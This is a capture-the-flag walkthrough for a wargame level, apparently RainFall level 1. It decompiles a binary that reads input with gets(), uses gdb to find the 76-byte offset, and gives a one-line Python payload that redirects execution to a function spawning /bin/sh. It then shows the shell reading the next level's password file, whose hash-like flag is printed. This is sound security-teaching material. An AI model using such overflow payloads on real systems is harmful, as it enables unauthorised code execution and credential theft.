# Level 01 Walkthrough

## Binary analysis

Decompiling shows the program uses `gets()` to read user input into a 0x40 (64 bytes) buffer, but does not check the length. The function `run()` prints a message and calls `system("/bin/sh")`.

main:
```
08048480    int32_t main(int32_t argc, char** argv, char** envp)
08048496        char buf[0x40]
08048496        return gets(&buf)
```

run:
```
08048444    int32_t run()
0804846d        fwrite(buf: "Good... Wait what?\n", size: 1, count: 0x13, fp: stdout)
0804847f        return system(line: "/bin/sh")
```

## Exploitation

The program is vulnerable to a classic buffer overflow. We can overwrite the return address to call `run()`.

We run the program in gdb with a cyclic pattern to find the offset, found on : https://wiremask.eu/tools/buffer-overflow-pattern-generator/

```
level1@RainFall:~$ gdb -q ./level1 
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/level1/level1 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
(gdb) print $eip
$1 = (void (*)()) 0x63413563
```
That's how we find the offset to be 76 bytes because 0x63413563 = "c5Ac".

## Commands used

```
(python -c 'print(b"A" * 76 + b"\x08\x04\x84\x44"[::-1])'; cat -) | ./level1 
```

## Result

After running the exploit, we get a shell as level2 and can read the password:

```
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
